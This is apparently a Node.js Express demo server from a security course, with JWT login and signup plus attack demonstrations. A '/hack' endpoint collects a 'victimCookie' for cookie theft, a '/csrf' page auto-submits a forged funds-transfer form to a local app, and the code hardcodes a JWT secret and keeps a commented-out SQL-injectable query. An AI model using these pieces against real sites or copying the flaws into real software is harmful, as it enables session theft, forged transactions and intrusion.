const express = require('express')
const bodyParser = require('body-parser')
const bcrypt = require('bcrypt');
const jwt = require('jsonwebtoken');
const cors = require('cors')

const port = parseInt(process.env.PORT, 10) || 3001
const { Client } = require('pg')

const DB_CONNECTION = {
    user: 'jwt',        
    database: 'jwt',
    password: 'jwt',
    host: process.env.DB_HOST || 'localhost',
    port: 5433
}

// NOT A GOOD PLACE FOR IT
const SECRET = "ddss_jwt"
const SALT_ROUNDS = 10;

const app = express()

// parse application/json
app.use(bodyParser.json())

const corsOptions = {
    origin: 'http://localhost:3000'
}

// app.use(cors(corsOptions))
// app.use(cors())

app.get('/hack', (req, res) => {
    const { victimCookie } = req.query;
    console.log('Victim Cookie: ', victimCookie);
    res.status(200).send(JSON.stringify({
        subject: 'ddss',
        year: 2019
    })); 
})

app.get('/cors', (req, res) => {
    // res.set('Access-Control-Allow-Origin', '*')
    res.set('Access-Control-Allow-Origin', 'http://localhost:3002')
   res.json({
        subject: 'ddss',
        year: 2019
   });
})

app.get('/csrf', async (req, res) => {
    return res.send(`<html>
        <main>
            <article>
                <form id="transaction-form" method="POST" action="http://localhost:3000/transactions">
                    <h1>Send funds</h1>
                    <fieldset>
                        <p>
                            <label>
                                Email destination
                                <input name="email" type="email" value="jcfa+2@dei.uc.pt" placeholer="Email to receive money"/>
                            </label>
                        <p>                        
                        <p>
                            <label>
                                Amount
                                <input name="amount" type="number" value="10000" placeholer="Write the amount"/>
                            </label>
                        </p>
                        <button type="submit">Send</button>
                    </fieldset>                    
                </form>
            </article>
        </main>
        <script>
            document.getElementById("transaction-form").submit();
        </script>
    </html>`);
})

app.post('/sign-up', async (req, res) => {
    const { name, email, password} = req.body
    console.log('Sign Up Body: ', req.body);
    const client = new Client(DB_CONNECTION)    
    try {      
        client.connect()

        const salt = await bcrypt.genSalt(SALT_ROUNDS);
        const hashedPassword = await bcrypt.hash(password, salt);
        console.log('Salt:', salt);
        console.log('Hashed password:', hashedPassword);
        
        const insertQuery = {
            text: 'insert into ddss_user (email, name, hashed_password, salt) values($1, $2, $3, $4)',
            values: [email, name, hashedPassword, salt],
        };
        
        await client.query(insertQuery);

        res.status(204).send();
    } catch(err) {
        res.status(500).send({ message: err.toString()});
    } finally {
        client.end()
    }  
})

app.post('/login', async (req, res) => {
    const client = new Client(DB_CONNECTION)
    const { email, password } = req.body;
    
    try {      
        client.connect()
        
        const selectQuery = {
            text: 'select * from ddss_user where email=$1',
            values: [email],
        };

        // const selectQuery = "select * from ddss_user where email='" + email + "'";
        
        const dbRes = await client.query(selectQuery);
        const isUserValid = !!(dbRes && dbRes.rowCount === 1);

        // const isUserValid = !!(dbRes && dbRes.rowCount > 0);

        console.log('Db Rest: ', dbRes);
        if (isUserValid) {
            const { user_id, hashed_password, salt } = dbRes.rows[0];

            const verifyHashed = await bcrypt.hash(password, salt);
            if (hashed_password === verifyHashed) {
                let token = jwt.sign(
                    {
                        userId: user_id
                    }, 
                    SECRET, 
                    { expiresIn: '1h'}
                );

                res.status(200).send(JSON.stringify({
                    token
                }));
            } else {
                res.status(401).send();
            }
        } else {
            res.status(401).send();
        }

    } catch(err) {
        res.status(500).send({ message: err.toString()});
    } finally {
        client.end()
    }   
})

app.get('/me', async (req, res) => {
    const client = new Client(DB_CONNECTION)
    try {  
        client.connect()

        // Express headers are auto converted to lowercase
        let token = req.headers['x-access-token'] || req.headers['authorization']; 
        if (token.startsWith('Bearer ')) {
            // Remove Bearer from string
            token = token.slice(7, token.length)
        }
        console.log('Token: ', token);
        if (token) {
            await jwt.verify(token, SECRET, async (err, decoded) => {
                console.log('Decoded: ', decoded);
                console.log('Err: ', err);
                if (err) {
                    res.status(401).send()
                } else {
                    const { userId } = decoded
                    const selectQuery = {
                        text: 'select * from ddss_user where user_id=$1',
                        values: [userId],
                    };

                    const dbRes = await client.query(selectQuery);
                    console.log('DB RES: ', dbRes);
                    const isUserValid = !!(dbRes && dbRes.rowCount === 1);
                    const { name } = dbRes.rows[0];

                    if (isUserValid) {
                        res.status(200).send(JSON.stringify({
                            name
                        }));
                    } else {
                        res.status(401).send()
                    }
                }
            });
        } else {
            res.status(401).send()
        }

    } catch {
        res.status(500).send({ message: 'error'});
    } finally {
        client.end()
    } 
})

app.listen(port, () => console.log(`Example app listening on port ${port}!`))
